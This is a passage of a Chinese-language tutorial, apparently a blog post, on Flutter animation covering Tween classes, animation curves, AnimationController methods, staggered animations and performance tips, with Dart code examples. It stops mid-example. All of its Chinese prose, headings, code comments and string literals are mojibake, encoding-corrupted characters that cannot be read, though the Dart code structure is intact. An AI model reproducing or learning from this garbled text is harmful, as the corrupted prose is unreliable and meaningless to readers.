<p>å¾ˆå¤šäººä¼šæœ‰ç–‘é—®ï¼šä¸ºä»€ä¹ˆæ”¹å˜å±æ€§å€¼å°±èƒ½äº§ç”ŸåŠ¨ç”»ï¼Ÿä¸‹é¢æˆ‘ä»¬æ·±å…¥æ¢è®¨å…¶èƒŒåçš„å®ç°åŸç†ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant U as ç”¨æˆ·äº¤äº’
    participant S as setState()
    participant W as éšå¼åŠ¨ç”»Widget
    participant E as åŠ¨ç”»å¼•æ“
    participant R as æ¸²æŸ“å±‚
    
    U-&gt;&gt;S: è§¦å‘çŠ¶æ€å˜åŒ–
    S-&gt;&gt;W: é‡å»ºWidgetæ ‘
    W-&gt;&gt;E: æ£€æµ‹åˆ°å±æ€§å˜åŒ–
    E-&gt;&gt;E: è®¡ç®—åŠ¨ç”»è¡¥é—´å€¼
    loop æ¯ä¸€å¸§
        E-&gt;&gt;W: æ›´æ–°åŠ¨ç”»å€¼
        W-&gt;&gt;R: é‡ç»˜ç•Œé¢
    end
    E-&gt;&gt;W: åŠ¨ç”»å®Œæˆ
</code></pre>
<p>ä¸‹é¢æ¥çœ‹ä¸€æ®µä»£ç ï¼Œæ¥è¾…åŠ©ç†è§£éšå¼åŠ¨ç”»ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// éšå¼åŠ¨ç”»çš„å†…éƒ¨é€»è¾‘</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimatedContainer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ImplicitlyAnimatedWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didUpdateWidget(AnimatedContainer oldWidget) {
    <span class="hljs-keyword">super</span>.didUpdateWidget(oldWidget);
    
    <span class="hljs-comment">// å½“å±æ€§å‘ç”Ÿå˜åŒ–æ—¶</span>
    <span class="hljs-keyword">if</span> (oldWidget.width != widget.width) {
      <span class="hljs-comment">// åˆ›å»ºåŠ¨ç”»æ§åˆ¶å™¨</span>
      <span class="hljs-comment">// åˆ›å»ºè¡¥é—´åŠ¨ç”»</span>
      <span class="hljs-comment">// å¯åŠ¨åŠ¨ç”»</span>
    }
  }
}
</code></pre>
<p>ç®€å•æ¥è¯´ï¼Œå½“<code>setState()</code>è¢«è°ƒç”¨æ—¶ï¼š</p>
<ol>
<li>Widgetæ ‘é‡å»º</li>
<li><code>AnimatedContainer</code>æ£€æµ‹åˆ°å±æ€§å€¼å˜åŒ–</li>
<li>è‡ªåŠ¨åˆ›å»ºåŠ¨ç”»æ§åˆ¶å™¨å’Œè¡¥é—´åŠ¨ç”»</li>
<li>å¯åŠ¨åŠ¨ç”»ï¼Œåœ¨æŒ‡å®šæ—¶é—´å†…å¹³æ»‘è¿‡æ¸¡åˆ°æ–°å€¼</li>
</ol>
<h2 data-id="heading-12">ä¸‰ã€è¡¥é—´åŠ¨ç”»</h2>
<h3 data-id="heading-13">3.1 ä»€ä¹ˆæ˜¯è¡¥é—´åŠ¨ç”»ï¼Ÿ</h3>
<p>"è¡¥é—´"è¿™ä¸ªè¯æ¥æºäºåŠ¨ç”»åˆ¶ä½œé¢†åŸŸï¼Œæ„æ€æ˜¯<strong>åœ¨èµ·å§‹çŠ¶æ€å’Œç»“æŸçŠ¶æ€ä¹‹é—´è¿‡æ¸¡å¸§</strong>ã€‚</p>
<p>åœ¨Flutterä¸­ï¼Œ<code>Tween</code>å°±æ˜¯åšè¿™ä¸ªå·¥ä½œçš„ï¼š</p>
<ul>
<li>ä½ å‘Šè¯‰å®ƒèµ·å§‹å€¼(begin)å’Œç»“æŸå€¼(end)</li>
<li>å®ƒè´Ÿè´£è®¡ç®—ä¸­é—´çš„æ‰€æœ‰å€¼</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªä»50åˆ°200çš„å°ºå¯¸è¡¥é—´åŠ¨ç”»</span>
Tween&lt;<span class="hljs-built_in">double</span>&gt; sizeTween = Tween&lt;<span class="hljs-built_in">double</span>&gt;(
  begin: <span class="hljs-number">50.0</span>,   <span class="hljs-comment">// å¼€å§‹å€¼</span>
  end: <span class="hljs-number">200.0</span>,    <span class="hljs-comment">// ç»“æŸå€¼</span>
);

<span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªä»çº¢è‰²åˆ°è“è‰²çš„é¢œè‰²è¡¥é—´åŠ¨ç”»  </span>
ColorTween colorTween = ColorTween(
  begin: Colors.red,
  end: Colors.blue,
);
</code></pre>
<h3 data-id="heading-14">3.2 Tweençš„å®Œæ•´ä½¿ç”¨æµç¨‹</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TweenAnimationExample</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _TweenAnimationExampleState createState() =&gt; _TweenAnimationExampleState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_TweenAnimationExampleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">TweenAnimationExample</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">SingleTickerProviderStateMixin</span> </span>{
  
  <span class="hljs-keyword">late</span> AnimationController _controller;
  <span class="hljs-keyword">late</span> Animation&lt;<span class="hljs-built_in">double</span>&gt; _sizeAnimation;
  <span class="hljs-keyword">late</span> Animation&lt;Color?&gt; _colorAnimation;
  <span class="hljs-keyword">late</span> Animation&lt;<span class="hljs-built_in">double</span>&gt; _rotationAnimation;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    <span class="hljs-comment">// 1. åˆ›å»ºåŠ¨ç”»æ§åˆ¶å™¨</span>
    _controller = AnimationController(
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>),
      vsync: <span class="hljs-keyword">this</span>,
    );
    
    <span class="hljs-comment">// 2. åˆ›å»ºè¡¥é—´åŠ¨ç”»</span>
    _sizeAnimation = Tween&lt;<span class="hljs-built_in">double</span>&gt;(
      begin: <span class="hljs-number">50.0</span>,
      end: <span class="hljs-number">200.0</span>,
    ).animate(_controller);
    
    _colorAnimation = ColorTween(
      begin: Colors.blue,
      end: Colors.red,
    ).animate(_controller);
    
    _rotationAnimation = Tween&lt;<span class="hljs-built_in">double</span>&gt;(
      begin: <span class="hljs-number">0.0</span>,
      end: <span class="hljs-number">2</span> * <span class="hljs-number">3.14159</span>,  <span class="hljs-comment">// 2Ï€å¼§åº¦ = 360åº¦</span>
    ).animate(_controller);
    
    <span class="hljs-comment">// 3. å¯åŠ¨åŠ¨ç”»</span>
    _controller.forward();
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _controller.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> AnimatedBuilder(
      animation: _controller,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Transform.rotate(
          angle: _rotationAnimation.value,
          child: Container(
            width: _sizeAnimation.value,
            height: _sizeAnimation.value,
            color: _colorAnimation.value,
            child: Center(
              child: Text(
                <span class="hljs-string">'åŠ¨ç”»ä¸­...'</span>,
                style: TextStyle(color: Colors.white),
              ),
            ),
          ),
        );
      },
    );
  }
}
</code></pre>
<h3 data-id="heading-15">3.3 Tweenæˆå‘˜</h3>
<p>Flutteræä¾›äº†å¤šç§ä¸“é—¨çš„Tweenç±»ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å°ºå¯¸</span>
SizeTween(
  begin: Size(<span class="hljs-number">50</span>, <span class="hljs-number">50</span>),
  end: Size(<span class="hljs-number">200</span>, <span class="hljs-number">200</span>),
)

<span class="hljs-comment">// çŸ©å½¢åŒºåŸŸ</span>
RectTween(
  begin: Rect.fromLTRB(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>),
  end: Rect.fromLTRB(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>, <span class="hljs-number">200</span>),  
)

<span class="hljs-comment">// æ•´æ•°</span>
IntTween(
  begin: <span class="hljs-number">0</span>,
  end: <span class="hljs-number">100</span>,
)

<span class="hljs-comment">// æ­¥è¿›</span>
StepTween(
  begin: <span class="hljs-number">0</span>,
  end: <span class="hljs-number">100</span>,
)

<span class="hljs-comment">// å¯ä»¥ä¸ºè‡ªå®šä¹‰ç±»å‹åˆ›å»ºè¡¥é—´åŠ¨ç”»</span>
Tween&lt;YourCustomType&gt;(
  begin: CustomType(),
  end: CustomType(),
)
</code></pre>
<h2 data-id="heading-16">å››ã€åŠ¨ç”»æ›²çº¿ä¸æ§åˆ¶å™¨</h2>
<h3 data-id="heading-17">4.1 åŠ¨ç”»æ›²çº¿ - Curves</h3>
<p>åŠ¨ç”»æ›²çº¿æœ¬è´¨å°±æ˜¯æ¨¡æ‹Ÿç°å®ç”Ÿæ´»ä¸­çš„è‡ªç„¶è¿åŠ¨è§„å¾‹ã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä½¿ç”¨ä¸åŒçš„åŠ¨ç”»æ›²çº¿</span>
Animation&lt;<span class="hljs-built_in">double</span>&gt; animation = CurvedAnimation(
  parent: controller,
  curve: Curves.easeInOut,     <span class="hljs-comment">// å…ˆåŠ é€Ÿå†å‡é€Ÿ</span>
  reverseCurve: Curves.easeIn, <span class="hljs-comment">// åå‘åŠ¨ç”»</span>
);
</code></pre>
<p><strong>å¸¸ç”¨çš„åŠ¨ç”»æ›²çº¿ï¼š</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// çº¿æ€§</span>
Curves.linear

<span class="hljs-comment">// æ›²çº¿</span>
Curves.easeIn        <span class="hljs-comment">// å…ˆæ…¢åå¿«</span>
Curves.easeOut       <span class="hljs-comment">// å…ˆå¿«åæ…¢  </span>
Curves.easeInOut     <span class="hljs-comment">// å…ˆæ…¢ï¼Œä¸­é—´å¿«ï¼Œåæ…¢</span>

<span class="hljs-comment">// å¼¹æ€§æ•ˆæœ</span>
Curves.bounceOut     <span class="hljs-comment">// å›å¼¹æ•ˆæœ</span>
Curves.elasticOut    <span class="hljs-comment">// å¼¹ç°§æ•ˆæœ</span>

<span class="hljs-comment">// å›å¼¹æ•ˆæœ</span>
Curves.decelerate    <span class="hljs-comment">// å…ˆå¿«åæ…¢</span>
</code></pre>
<h3 data-id="heading-18">4.2 ä¸åŒæ›²çº¿æ•ˆæœ</h3>
<p>ä¸‹é¢åˆ›å»ºä¸€ä¸ªä¸åŒæ›²çº¿çš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CurvesDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _CurvesDemoState createState() =&gt; _CurvesDemoState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_CurvesDemoState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">CurvesDemo</span>&gt; <span class="hljs-title">with</span> <span class="hljs-title">SingleTickerProviderStateMixin</span> </span>{
  <span class="hljs-keyword">late</span> AnimationController _controller;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Curve&gt; _curves = [
    Curves.linear,
    Curves.easeIn,
    Curves.easeOut,
    Curves.easeInOut,
    Curves.bounceOut,
    Curves.elasticOut,
  ];
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt; _curveNames = [
    <span class="hljs-string">'linear'</span>,
    <span class="hljs-string">'easeIn'</span>, 
    <span class="hljs-string">'easeOut'</span>,
    <span class="hljs-string">'easeInOut'</span>,
    <span class="hljs-string">'bounceOut'</span>,
    <span class="hljs-string">'elasticOut'</span>,
  ];
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _controller = AnimationController(
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>),
      vsync: <span class="hljs-keyword">this</span>,
    )..repeat(reverse: <span class="hljs-keyword">true</span>);  <span class="hljs-comment">// å¾ªç¯</span>
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _controller.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ListView.builder(
      itemCount: _curves.length,
      itemBuilder: (context, index) {
        <span class="hljs-keyword">return</span> Padding(
          padding: EdgeInsets.all(<span class="hljs-number">8.0</span>),
          child: Column(
            children: [
              Text(_curveNames[index]),
              SizedBox(height: <span class="hljs-number">10</span>),
              Container(
                height: <span class="hljs-number">50</span>,
                child: AnimatedBuilder(
                  animation: _controller,
                  builder: (context, child) {
                    <span class="hljs-keyword">final</span> animation = CurvedAnimation(
                      parent: _controller,
                      curve: _curves[index],
                    );
                    <span class="hljs-keyword">return</span> Container(
                      width: <span class="hljs-number">50</span> + animation.value * <span class="hljs-number">200</span>,  <span class="hljs-comment">// å®½åº¦ä»50åˆ°250</span>
                      color: Colors.blue,
                      child: Center(
                        child: Text(<span class="hljs-string">'<span class="hljs-subst">${(animation.value * <span class="hljs-number">100</span>).round()}</span>%'</span>),
                      ),
                    );
                  },
                ),
              ),
            ],
          ),
        );
      },
    );
  }
}
</code></pre>
<h2 data-id="heading-19">äº”ã€AnimationController</h2>
<h3 data-id="heading-20">5.1 åŸºæœ¬æ“ä½œ</h3>
<p><code>AnimationController</code>ï¼šæ§åˆ¶åŠ¨ç”»çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimationControllerExample</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _AnimationControllerExampleState createState() =&gt; _AnimationControllerExampleState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_AnimationControllerExampleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">AnimationControllerExample</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">SingleTickerProviderStateMixin</span> </span>{
  
  <span class="hljs-keyword">late</span> AnimationController _controller;
  <span class="hljs-keyword">late</span> Animation&lt;<span class="hljs-built_in">double</span>&gt; _animation;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    _controller = AnimationController(
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>),
      vsync: <span class="hljs-keyword">this</span>,
    );
    
    _animation = Tween&lt;<span class="hljs-built_in">double</span>&gt;(begin: <span class="hljs-number">0</span>, end: <span class="hljs-number">300</span>).animate(_controller);
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _controller.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        Container(
          height: _animation.value,
          width: _animation.value,
          color: Colors.blue,
        ),
        SizedBox(height: <span class="hljs-number">20</span>),
        Row(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: [
            ElevatedButton(
              onPressed: _controller.forward,  <span class="hljs-comment">// æ­£å‘</span>
              child: Text(<span class="hljs-string">'æ’­æ”¾'</span>),
            ),
            ElevatedButton(
              onPressed: _controller.reverse,  <span class="hljs-comment">// åå‘</span>
              child: Text(<span class="hljs-string">'å€’æ”¾'</span>),
            ),
            ElevatedButton(
              onPressed: _controller.stop,     <span class="hljs-comment">// æš‚åœ</span>
              child: Text(<span class="hljs-string">'æš‚åœ'</span>),
            ),
            ElevatedButton(
              onPressed: () {
                _controller.reset();           <span class="hljs-comment">// é‡ç½®</span>
                _controller.forward();
              },
              child: Text(<span class="hljs-string">'é‡ç½®å¹¶æ’­æ”¾'</span>),
            ),
          ],
        ),
        SizedBox(height: <span class="hljs-number">20</span>),
        Text(<span class="hljs-string">'å½“å‰å€¼: <span class="hljs-subst">${_animation.value.toStringAsFixed(<span class="hljs-number">1</span>)}</span>'</span>),
        Text(<span class="hljs-string">'å½“å‰çŠ¶æ€: <span class="hljs-subst">${_controller.status.toString()}</span>'</span>),
      ],
    );
  }
}
</code></pre>
<h3 data-id="heading-21">5.2 ä½¿ç”¨æŠ€å·§</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// åŠ¨ç”»æ§åˆ¶çš„é«˜çº§æ–¹æ³•</span>

<span class="hljs-comment">// 1. ä»ç‰¹å®šå€¼å¼€å§‹</span>
_controller.animateTo(<span class="hljs-number">0.5</span>);  <span class="hljs-comment">// ä»å½“å‰å€¼åŠ¨ç”»åˆ°0.5</span>

<span class="hljs-comment">// 2. ç›¸å¯¹åŠ¨ç”»</span>
_controller.forward(from: <span class="hljs-number">0.0</span>);  <span class="hljs-comment">// ä»0.0å¼€å§‹æ­£å‘åŠ¨ç”»</span>

<span class="hljs-comment">// 3. é‡å¤åŠ¨ç”»</span>
_controller.repeat(         <span class="hljs-comment">// æ— é™é‡å¤</span>
  min: <span class="hljs-number">0.2</span>,                 <span class="hljs-comment">// æœ€å°å€¼</span>
  max: <span class="hljs-number">0.8</span>,                 <span class="hljs-comment">// æœ€å¤§å€¼</span>
  reverse: <span class="hljs-keyword">true</span>,            <span class="hljs-comment">// å¾€è¿”æ‰§è¡Œ</span>
  period: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>), <span class="hljs-comment">// å¾ªç¯å‘¨æœŸ</span>
);

<span class="hljs-comment">// 4. è·å–åŠ¨ç”»ä¿¡æ¯</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ˜¯å¦åŠ¨ç”»ä¸­: <span class="hljs-subst">${_controller.isAnimating}</span>'</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ˜¯å¦å®Œæˆ: <span class="hljs-subst">${_controller.isCompleted}</span>'</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ˜¯å¦åœæ­¢: <span class="hljs-subst">${_controller.isDismissed}</span>'</span>);
</code></pre>
<h2 data-id="heading-22">å…­ã€è‡ªå®šä¹‰æ˜¾å¼åŠ¨ç”»ä¸æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-23">6.1 è‡ªå®šä¹‰æ˜¾å¼åŠ¨ç”»</h3>
<p>æœ‰æ—¶å€™éšå¼åŠ¨ç”»ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œè¿™æ—¶å€™å°±éœ€è¦è‡ªå®šä¹‰æ˜¾å¼åŠ¨ç”»ã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CustomExplicitAnimation</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _CustomExplicitAnimationState createState() =&gt; _CustomExplicitAnimationState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_CustomExplicitAnimationState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">CustomExplicitAnimation</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">SingleTickerProviderStateMixin</span> </span>{
  
  <span class="hljs-keyword">late</span> AnimationController _controller;
  <span class="hljs-keyword">late</span> Animation&lt;<span class="hljs-built_in">double</span>&gt; _sizeAnimation;
  <span class="hljs-keyword">late</span> Animation&lt;<span class="hljs-built_in">double</span>&gt; _opacityAnimation;
  <span class="hljs-keyword">late</span> Animation&lt;Color?&gt; _colorAnimation;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    _controller = AnimationController(
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">3</span>),
      vsync: <span class="hljs-keyword">this</span>,
    );
    
    <span class="hljs-comment">// åˆ›å»ºäº¤é”™åŠ¨ç”»æ•ˆæœ</span>
    _sizeAnimation = Tween&lt;<span class="hljs-built_in">double</span>&gt;(
      begin: <span class="hljs-number">50.0</span>,
      end: <span class="hljs-number">200.0</span>,
    ).animate(CurvedAnimation(
      parent: _controller,
      curve: Interval(<span class="hljs-number">0.0</span>, <span class="hljs-number">0.6</span>, curve: Curves.easeInOut), <span class="hljs-comment">// åªåœ¨å‰60%æ—¶é—´æ‰§è¡Œ</span>
    ));
    
    _opacityAnimation = Tween&lt;<span class="hljs-built_in">double</span>&gt;(
      begin: <span class="hljs-number">0.3</span>,
      end: <span class="hljs-number">1.0</span>,
    ).animate(CurvedAnimation(
      parent: _controller,
      curve: Interval(<span class="hljs-number">0.2</span>, <span class="hljs-number">0.8</span>, curve: Curves.easeIn), <span class="hljs-comment">// ä»20%åˆ°80%æ—¶é—´æ‰§è¡Œ</span>
    ));
    
    _colorAnimation = ColorTween(
      begin: Colors.blue,
      end: Colors.purple,
    ).animate(CurvedAnimation(
      parent: _controller,
      curve: Interval(<span class="hljs-number">0.5</span>, <span class="hljs-number">1.0</span>, curve: Curves.easeOut), <span class="hljs-comment">// ä»50%æ—¶é—´å¼€å§‹æ‰§è¡Œ</span>
    ));
    
    _controller.forward();
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _controller.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> AnimatedBuilder(
      animation: _controller,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Opacity(
          opacity: _opacityAnimation.value,
          child: Container(
            width: _sizeAnimation.value,
            height: _sizeAnimation.value,
            decoration: BoxDecoration(
              color: _colorAnimation.value,
              borderRadius: BorderRadius.circular(<span class="hljs-number">20</span>),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(<span class="hljs-number">0.3</span>),
                  blurRadius: <span class="hljs-number">10</span>,
                  offset: Offset(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>),
                ),
              ],
            ),
            child: Center(
              child: Text(
                <span class="hljs-string">'è‡ªå®šä¹‰åŠ¨ç”»'</span>,
                style: TextStyle(
                  color: Colors.white,
                  fontSize: <span class="hljs-number">18</span>,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ),
        );
      },
    );
  }
}
</code></pre>
<p>äºŒè€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿéšå¼åŠ¨ç”» vs æ˜¾å¼åŠ¨ç”»</p>






























<table><thead><tr><th>ç»´åº¦</th><th>éšå¼åŠ¨ç”»</th><th>æ˜¾å¼åŠ¨ç”»</th></tr></thead><tbody><tr><td>æ§åˆ¶</td><td>è‡ªåŠ¨æ§åˆ¶</td><td>å®Œå…¨æ§åˆ¶</td></tr><tr><td>ä»£ç é‡</td><td>ç®€å•</td><td>ç›¸å¯¹å¤æ‚</td></tr><tr><td>çµæ´»æ€§</td><td>æœ‰é™</td><td>éå¸¸é«˜</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>ç®€å•å±æ€§å˜åŒ–</td><td>å¤æ‚åŠ¨ç”»åºåˆ—</td></tr></tbody></table>
<h3 data-id="heading-24">6.2 æ€§èƒ½ä¼˜åŒ–</h3>
<p>åŠ¨ç”»æ€§èƒ½å¾ˆé‡è¦ï¼Œä¸å¥½çš„åŠ¨ç”»æ•ˆæœä¼šè®©ç”¨æˆ·è§‰å¾—åº”ç”¨å¡é¡¿ã€‚è¿™é‡Œæœ‰å‡ ä¸ªä¼˜åŒ–æŠ€å·§ï¼š</p>
<h4 data-id="heading-25">6.2.1 ä½¿ç”¨AnimatedBuilderå±€éƒ¨é‡å»º</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¸æ¨èï¼šæ•´ä¸ªé¡µé¢é‡å»º</span>
<span class="hljs-meta">@override</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> Scaffold(
    body: Opacity(
      opacity: _animation.value,
      child: TestWidget(), <span class="hljs-comment">// ç»„ä»¶è¢«é‡å¤é‡å»º</span>
    ),
  );
}

<span class="hljs-comment">// æ¨èï¼šåªé‡å»ºåŠ¨ç”»éƒ¨åˆ†</span>
<span class="hljs-meta">@override</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> Scaffold(
    body: AnimatedBuilder(
      animation: _animation,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Opacity(
          opacity: _animation.value,
          child: child, <span class="hljs-comment">// ä½¿ç”¨ç¼“å­˜çš„child</span>
        );
      },
      child: TestWidget(), <span class="hljs-comment">// ç»„ä»¶åªæ„å»ºä¸€æ¬¡</span>
    ),
  );
}
</code></pre>
<h4 data-id="heading-26">6.2.2 ä½¿ç”¨Transformä»£æ›¿å¸ƒå±€å±æ€§</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¸æ¨èï¼šæ”¹å˜å°ºå¯¸ä¼šè§¦å‘å¸ƒå±€é‡æ–°è®¡ç®—</span>
Container(
  width: _animation.value,
  height: _animation.value,
)

<span class="hljs-comment">// æ¨èï¼šTransformåªå½±å“ç»˜åˆ¶ï¼Œä¸è§¦å‘å¸ƒå±€</span>
Transform.scale(
  scale: _animation.value,
  child: Container(
    width: <span class="hljs-number">100</span>,  <span class="hljs-comment">// å›ºå®šå°ºå¯¸</span>
    height: <span class="hljs-number">100</span>,
  ),
)
</code></pre>
<h4 data-id="heading-27">6.2.3 é¿å…åœ¨åŠ¨ç”»ä¸­ä½¿ç”¨Opacity</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¸æ¨èï¼šOpacityä¼šå¯¼è‡´æ•´ä¸ªå­æ ‘é‡ç»˜</span>
Opacity(
  opacity: _animation.value,
  child: TestComplexWidget(),
)

<span class="hljs-comment">// æ¨èï¼šä½¿ç”¨é¢œè‰²é€æ˜åº¦</span>
Container(
  color: Colors.blue.withOpacity(_animation.value),
  child: TestComplexWidget(),
)

<span class="hljs-comment">// æ¨èï¼šä½¿ç”¨FadeTransition</span>
FadeTransition(
  opacity: _animation,
  child: TestComplexWidget(),
)
</code></pre>
<h3 data-id="heading-28">6.3 åˆ›å»ºä¸€ä¸ªåŠ è½½åŠ¨ç”»</h3>
<p>ä¸‹é¢ç”¨ä¸€ä¸ªåŠ è½½åŠ¨ç”»æ•ˆæœä¸²ä¸€ä¸‹ä¸Šé¢æ‰€è®²å†…å®¹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmoothLoadingAnimation</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _SmoothLoadingAnimationState createState() =&gt; _SmoothLoadingAnimationState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SmoothLoadingAnimationState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SmoothLoadingAnimation</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">SingleTickerProviderStateMixin</span> </span>{
  
  <span class="hljs-keyword">late</span> AnimationController _controller;
  <span class="hljs-keyword">late</span> Animation&lt;<span class="hljs-built_in">double</span>&gt; _rotationAnimation;
  <span class="hljs-keyword">late</span> Animation&lt;<span class="hljs-built_in">double</span>&gt; _scaleAnimation;
  <span class="hljs-keyword">late</span> Animation&lt;Color?&gt; _colorAnimation;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    _controller = AnimationController(
      duration: <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">1500</span>),
      vsync: <span class="hljs-keyword">this</span>,
    )..repeat(reverse: <span class="hljs-keyword">true</span>);
    
    _rotationAnimation = Tween&lt;<span class="hljs-built_in">double</span>&gt;(
      begin: <span class="hljs-number">0.0</span>,
      end: <span class="hljs-number">2</span> * <span class="hljs-number">3.14159</span>,
    ).animate(CurvedAnimation(
      parent: _controller,
      curve: Curves.easeInOut,
    ));
    
    _scaleAnimation = Tween&lt;<span class="hljs-built_in">double</span>&gt;(
      begin: <span class="hljs-number">0.8</span>,
      end: <span class="hljs-number">1.2</span>,
    ).animate(CurvedAnimation(
      parent: _controller,
      curve: Curves.easeInOut,
    ));
    
    _colorAnimation = ColorTween(
      begin: Colors.blue[<span class="hljs-number">300</span>],
      end: Colors.blue[<span class="hljs-number">700</span>],
    ).animate(CurvedAnimation(
      parent: _controller,
      curve: Curves.easeInOut,
    ));
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _controller.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
  
  <span class="hljs-meta">@override</span>
